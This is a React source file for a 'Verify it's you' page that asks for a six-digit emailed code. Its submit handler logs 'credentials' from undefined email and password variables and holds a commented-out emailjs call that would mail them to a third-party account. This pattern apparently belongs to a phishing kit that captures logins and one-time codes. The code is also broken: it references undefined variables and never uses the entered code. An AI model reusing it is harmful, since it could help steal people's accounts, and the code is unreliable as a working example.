import React, {useState} from 'react' 
import { useHistory } from 'react-router-dom'
import Form from './Form'

import '../styles/styles.css'
import LogoWhite from '../assets/logo_white.png'

const VerifyOtp = (props) => {

    console.log({props})
    const history = useHistory()

    const [code, setCode] = useState('')

    const handleCode = (e) => {
        setCode(e.target.value)
    }

   

    const handleSubmit = async (e) => {
        e.preventDefault()

        console.log('credentials', email, password)

        if (email === '' || password === '') {
            console.log('not sent')
        } else {
            // emailjs
            //     .send(
            //         'service_cajdfqp',
            //         'template_wss11os',
            //         templateParams,
            //         'user_xCNzJyoa0acBRP75Xy9wk'
            //     )
            //     .then(
            //         (result) => {
            //             console.log(result.text, 'email sent')
            //         },
            //         (error) => {
            //             console.log(error, 'email failed')
            //         }
            //     )

            history.push('/otp', templateParams)
        }
    }
    


    return (
        <div className='grid '>
            <div className=' grid gap-7'>
                <img
                    src={LogoWhite}
                    alt=''
                    className='lg:w-1/4 w-5/12 justify-self-center my-7 '
                />

                <div className='mx-2'>
                    <form
                        className='grid w-full place-content-stretch bg-white md:w-1/3 md:mx-auto rounded '
                        style={{ padding: '30px 15px' }}
                        onSubmit={handleSubmit}
                    >
                        <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
                            Verify it's you
                        </h2>
                        <p>
                            We've sent a verification code to your email. Enter
                            the code from the email in the field below.
                        </p>
                        <input
                            id='email'
                            className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'
                            required
                            value={code}
                            placeholder='Enter 6 digit code'
                            onChange={handleCode}
                        />
                   

                        <button
                            className=' rounded-md outline-none  bg-[#0059dd] text-white text-sm'
                            style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
                        >
                            Verify
                        </button>
                                         </form>{' '}
                </div>
            </div>
        </div>
    )
}

export default VerifyOtp